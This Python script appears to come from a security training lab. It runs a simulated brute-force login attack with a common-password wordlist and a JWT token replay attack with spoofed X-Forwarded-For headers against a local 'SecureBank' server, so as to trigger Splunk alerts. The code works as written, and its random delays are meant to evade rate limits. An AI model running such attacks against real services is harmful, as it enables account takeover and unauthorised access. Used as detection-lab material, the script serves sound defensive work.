#!/usr/bin/env python3
"""
SecureBank — Episode 4 Attack Script
Combined Brute Force + JWT Replay Simulation

What this script does:
  Phase 1 → Login as admin to steal a real token from MySQL
  Phase 2 → Run brute force attack (50 wrong passwords) against /login
  Phase 3 → Run JWT replay attack (30 replays) against /admin
  Both phases run concurrently using threads — realistic attack pattern

Usage:
  pip install requests
  python3 attack_ep4.py

Expected outcome:
  → 50+ LOGIN_FAILED events in security.log
  → 30  TOKEN_REPLAY_DETECTED events in security.log
  → Splunk threshold alerts should fire
  → Run report_generator.py after this to generate incident report
"""

import requests
import threading
import time
import random
import json
from datetime import datetime

BASE_URL = "http://localhost:3000"

# ── ANSI colors ──
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ── Shared state between threads ──
attack_stats = {
    "brute_force_attempts": 0,
    "brute_force_success":  0,
    "replay_attempts":      0,
    "replay_success":       0,
    "start_time":           None,
    "end_time":             None,
}
stats_lock = threading.Lock()

# ── Wordlist for brute force ──
# Realistic password list — common passwords attackers actually use
WORDLIST = [
    "password", "123456", "password123", "admin", "letmein",
    "welcome", "monkey", "dragon", "master", "abc123",
    "qwerty", "111111", "pass123", "test", "guest",
    "root", "toor", "changeme", "1234567890", "login",
    "hello", "iloveyou", "sunshine", "princess", "football",
    "shadow", "superman", "michael", "jessica", "password1",
    "trustno1", "batman", "baseball", "access", "mustang",
    "hockey", "dallas", "passw0rd", "1qaz2wsx", "starwars",
    "whatever", "zxcvbn", "654321", "777777", "donald",
    "freedom", "hunter", "ranger", "tigger", "soccer",
    "batman123", "wrongpass_final"  # last one always fails too
]


def banner():
    print(f"""
{BOLD}{'='*62}{RESET}
{RED}{BOLD}  SecureBank — Episode 4 Attack Simulation{RESET}
  Phase 1: Brute Force Login
  Phase 2: JWT Token Replay
  Running both attacks concurrently
{BOLD}{'='*62}{RESET}
""")


def log_step(phase, msg, color=BLUE):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {color}[{ts}] [{phase}]{RESET} {msg}")


def separator(title=""):
    if title:
        print(f"\n{CYAN}{BOLD}  ── {title} ──{RESET}")
    else:
        print(f"  {CYAN}{'─'*56}{RESET}")


# ══════════════════════════════════════════
# PHASE 0: Steal admin token
# Login as admin once — get a real Bearer token
# This simulates the attacker having obtained
# a valid admin session (from Episode 3)
# ══════════════════════════════════════════
def steal_admin_token():
    separator("Phase 0: Acquiring admin token")
    try:
        resp = requests.post(
            f"{BASE_URL}/login",
            json={"username": "admin", "password": "admin123"},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        if resp.status_code == 200:
            token = resp.json()["access_token"]
            log_step("STEAL", f"Admin token acquired: {token[:16]}...", GREEN)
            return token
        else:
            log_step("STEAL", f"Failed to get admin token: {resp.status_code}", RED)
            return None
    except requests.exceptions.ConnectionError:
        print(f"\n  {RED}✗ Cannot connect to server.{RESET}")
        print(f"  Make sure node server.js is running on port 3000\n")
        exit(1)


# ══════════════════════════════════════════
# PHASE 1: Brute Force Attack
# Try every password in the wordlist against admin
# This generates LOGIN_FAILED events in bulk
# Splunk alert threshold: 10 failures in 5 minutes
# ══════════════════════════════════════════
def run_brute_force():
    separator("Phase 1: Brute Force Attack")
    log_step("BF", f"Starting brute force — {len(WORDLIST)} passwords in wordlist", YELLOW)
    log_step("BF", "Target: POST /login | Username: admin", YELLOW)

    for i, password in enumerate(WORDLIST):
        try:
            resp = requests.post(
                f"{BASE_URL}/login",
                json={"username": "admin", "password": password},
                headers={"Content-Type": "application/json"},
                timeout=5
            )

            with stats_lock:
                attack_stats["brute_force_attempts"] += 1

            status = resp.status_code
            symbol = f"{GREEN}✓{RESET}" if status == 200 else f"{RED}✗{RESET}"

            if status == 200:
                with stats_lock:
                    attack_stats["brute_force_success"] += 1
                log_step("BF", f"[{i+1:02d}/{len(WORDLIST)}] {symbol} '{password}' → HIT! Status {status}", GREEN)
            else:
                log_step("BF", f"[{i+1:02d}/{len(WORDLIST)}] {symbol} '{password}' → {status}", RESET)

            # Random delay 0.1–0.4s — realistic attack pacing
            # Avoids looking like a perfect machine, harder to rate-limit
            time.sleep(random.uniform(0.1, 0.4))

        except Exception as e:
            log_step("BF", f"Request error: {e}", RED)

    log_step("BF", f"Brute force complete — {attack_stats['brute_force_attempts']} attempts", YELLOW)


# ══════════════════════════════════════════
# PHASE 2: JWT Replay Attack
# Repeatedly replay the stolen admin token
# Each replay from a "different context" triggers
# TOKEN_REPLAY_DETECTED in security.log
# Splunk alert threshold: 5 replays in 5 minutes
# ══════════════════════════════════════════
def run_jwt_replay(stolen_token, replay_count=30):
    separator("Phase 2: JWT Replay Attack")
    log_step("JWT", f"Starting token replay — {replay_count} replays", YELLOW)
    log_step("JWT", f"Token: {stolen_token[:16]}...", YELLOW)
    log_step("JWT", "Target: GET /admin", YELLOW)

    # Simulate different attacker IPs via X-Forwarded-For
    # In a real attack the requests come from different machines
    fake_ips = [
        "192.168.1.100", "10.0.0.50", "172.16.0.99",
        "192.168.2.200", "10.10.10.10", "192.168.100.5"
    ]

    for i in range(replay_count):
        try:
            fake_ip = random.choice(fake_ips)
            headers = {
                "Authorization":  f"Bearer {stolen_token}",
                "X-Forwarded-For": fake_ip,
                "User-Agent":     f"AttackerBot/1.0 (replay-{i+1})"
            }

            resp = requests.get(
                f"{BASE_URL}/admin",
                headers=headers,
                timeout=5
            )

            with stats_lock:
                attack_stats["replay_attempts"] += 1

            if resp.status_code == 200:
                with stats_lock:
                    attack_stats["replay_success"] += 1
                log_step("JWT", f"[{i+1:02d}/{replay_count}] {GREEN}✓{RESET} Admin accessed — IP: {fake_ip}", GREEN)
            else:
                log_step("JWT", f"[{i+1:02d}/{replay_count}] {RED}✗{RESET} Blocked {resp.status_code}", RED)

            # Slightly faster than brute force — replay is a confident attack
            time.sleep(random.uniform(0.05, 0.25))

        except Exception as e:
            log_step("JWT", f"Request error: {e}", RED)

    log_step("JWT", f"Replay complete — {attack_stats['replay_attempts']} replays fired", YELLOW)


# ══════════════════════════════════════════
# MAIN — run both attacks concurrently
# threading.Thread lets both phases run
# at the same time — more realistic attack
# pattern, generates interleaved log events
# ══════════════════════════════════════════
def main():
    banner()

    # Phase 0: get real token first
    stolen_token = steal_admin_token()
    if not stolen_token:
        print(f"  {RED}Aborting — could not obtain token{RESET}")
        return

    print(f"""
  {YELLOW}Both attacks will now run concurrently.
  Watch your terminal — events are interleaved.
  Check security.log and Splunk after completion.{RESET}
""")

    attack_stats["start_time"] = datetime.now()

    # Launch both attack threads simultaneously
    t1 = threading.Thread(target=run_brute_force, name="BruteForce")
    t2 = threading.Thread(target=run_jwt_replay, args=(stolen_token, 30), name="JWTReplay")

    t1.start()
    # Small stagger so logs interleave naturally
    time.sleep(0.5)
    t2.start()

    # Wait for both to finish
    t1.join()
    t2.join()

    attack_stats["end_time"] = datetime.now()
    duration = (attack_stats["end_time"] - attack_stats["start_time"]).seconds

    # ── FINAL SUMMARY ──
    print(f"""
{BOLD}{'='*62}{RESET}
{RED}{BOLD}  EPISODE 4 ATTACK SUMMARY{RESET}
{BOLD}{'='*62}{RESET}

  Duration:          {duration}s
  
  Brute Force:
    Attempts:        {attack_stats['brute_force_attempts']}
    Successful hits: {attack_stats['brute_force_success']}
    
  JWT Replay:
    Replays fired:   {attack_stats['replay_attempts']}
    Admin accessed:  {attack_stats['replay_success']}

  What Splunk should now detect:
  → LOGIN_FAILED threshold alert (≥10 in 5 min)
  → TOKEN_REPLAY_DETECTED threshold alert (≥5 in 5 min)
  → Both events visible in security.log

  Next step:
  → Run: python3 report_generator.py
  → This will parse security.log and generate
    your incident report automatically

{BOLD}{'='*62}{RESET}
""")


if __name__ == "__main__":
    main()